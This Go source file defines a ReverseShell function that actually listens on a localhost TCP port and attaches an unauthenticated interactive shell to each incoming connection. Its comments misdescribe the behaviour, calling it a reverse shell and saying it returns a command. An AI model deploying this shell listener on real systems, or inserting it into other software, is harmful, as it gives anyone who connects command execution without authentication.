package tool

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func handleShell(ctx context.Context, conn net.Conn, shell string) {
	// create command
	cmd := exec.CommandContext(ctx, shell)
	fmt.Printf("Running shell: %s\n", shell)

	// set stdin, stdout, stderr
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// run command
	if err := cmd.Run(); err != nil {
		fmt.Printf("Error running command: %s\n", err.Error())
	}

	fmt.Println("finished running")
}

// ReverseShell is a function that returns a reverse shell command
func ReverseShell(port int, shell string) error {
	ctrlc := false
	// connect to listener
	listener, err := net.Listen("tcp", fmt.Sprintf("localhost:%d", port))
	if err != nil {
		return err
	}

	var conn net.Conn

	// handle ctrl+c
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	// clean up
	go func() {
		select {
		case <-c:
			cancel()
			if conn != nil {
				conn.Close()
				fmt.Printf("Connection closed: %s\n", conn.RemoteAddr().String())
			}
			if listener != nil {
				listener.Close()
				fmt.Printf("Listener closed: %s\n", listener.Addr().String())
			}
		}
		ctrlc = true
	}()

	fmt.Printf("Listening on port: %d\n", port)

	for {
		if ctrlc {
			break
		}

		conn, err = listener.Accept()
		if err != nil {
			return err
		}

		fmt.Printf("Incoming connection from: %s\n", conn.RemoteAddr().String())

		defer conn.Close()
		defer cancel()

		go handleShell(ctx, conn, shell)
	}

	return nil
}
